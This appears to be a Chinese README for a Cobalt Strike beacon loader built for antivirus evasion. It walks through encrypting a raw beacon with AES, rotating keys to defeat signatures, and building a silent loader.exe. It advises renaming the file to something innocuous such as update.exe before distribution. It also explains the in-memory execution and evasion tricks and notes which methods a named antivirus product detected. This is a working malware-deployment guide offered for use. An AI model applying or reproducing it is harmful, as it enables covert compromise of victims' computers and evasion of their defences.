#  loader.exe（AES-256-CBC 免杀）

## 目录说明（本文件夹）

| 文件 | 作用 |
|---|---|
| `loader.exe` | 当前打包好的成品（示例，双击即运行） |
| `beacon_x64.bin` | 当前使用的原始 raw beacon（示例输入） |
| `loader_v8.c` | Loader 源码（**不要改**） |
| `payload_v8.h` | AES 密文载荷（build.ps1 自动重新生成，**不要手改**） |
| `encrypt_aes.py` | AES 加密脚本（**换密钥要改这里**） |
| `build.ps1` | 一键打包脚本 |

## 环境要求（一次性准备）

1. **Python 3** + cryptography 库：
   ```
   pip install cryptography
   ```
2. **MinGW gcc**（如 [w64devkit](https://github.com/skeeto/w64devkit)），解压后把 `bin` 目录加入 PATH，或打包时用 `-Gcc` 参数指定：
   ```
   powershell -ExecutionPolicy Bypass -File build.ps1 -Gcc D:\w64devkit\bin\gcc.exe
   ```

## 打包新 beacon（每次生成新 payload 后）

### 第 1 步：放置新 bin
把你 CS 导出的 raw x64 beacon 放到本目录，例如 `D:\deepseek\ai-av-evasion-optimized\new_beacon.bin`。

> 路径随意，第 3 步引用即可。

### 第 2 步：换密钥（强烈建议每次换）
编辑 `encrypt_aes.py`，把 `KEY` 和 `IV` 换成新的随机值。生成方法（PowerShell）：
```powershell
# 32 字节 KEY（64 位 hex）
-join ((1..32 | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) }))
# 16 字节 IV（32 位 hex）
-join ((1..16 | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) }))
```
把生成的两串 hex 分别填入 `encrypt_aes.py` 的 `KEY = bytes.fromhex("...")` 和 `IV = bytes.fromhex("...")`。

> **为什么换**：密钥不同 → 密文不同 → 文件特征完全不同 → 规避已入库的特征。

### 第 3 步：打包
```powershell
powershell -ExecutionPolicy Bypass -File build.ps1 -Beacon D:\deepseek\ai-av-evasion-optimized\new_beacon.bin
```
或省略 `-Beacon` 直接用目录里的 `beacon_x64.bin`。

### 第 4 步：验证
1. 双击 `loader.exe`（**只双击一次**，多开会多 beacon）
2. CS 客户端看到新 beacon 上线
3. 发 `getuid` 验证任务执行，`run whoami` / `run ipconfig` 验证命令

### 第 5 步：部署
- 把 `loader.exe` 改名成无害名字（如 `update.exe`）再分发
- 单文件部署，无任何额外依赖

## 常见问题

| 现象 | 处理 |
|---|---|
| 双击没窗口/没反应 | **正常**，Loader 无窗口静默运行；看 CS 客户端是否有 beacon |
| beacon 上线但命令无输出 | 先 `sleep 1`，回连变快=任务链路正常；命令优先用 `run` 而非 `shell` |
| 杀软检出 | 换密钥重新打包（第 2 步）；若仍检出，换新生成的 beacon 再试 |
| build.ps1 报 gcc 找不到 | 用 `-Gcc` 指定 gcc.exe 完整路径 |
| 报 cryptography 未安装 | `pip install cryptography` |

## 技术要点（loader_v8.c 做了什么）

1. 内嵌 **AES-256-CBC 密文**（密文高熵，AV 无法解密识别载荷）
2. 运行时通过 **BCrypt API**（bcrypt.dll，GetProcAddress 动态解析，不进导入表）解密
3. `VirtualAlloc(RW)` → 写入 → `VirtualProtect(RX)` → 函数指针执行
4. 敏感字符串（bcrypt.dll）编译期 0x5A 加密

## 踩坑记录（为什么是现在这个方案）

- ❌ 盲扫字节替换（patch）：破坏 CS beacon 任务逻辑 → 上线正常但任务全挂
- ❌ XOR + IPv4 混淆：火绒可解密识别（Backdoor/CobaltStrike.ag）
- ✅ **AES-256-CBC**：火绒实时防护 + 快速扫描双通过，CS 功能全通
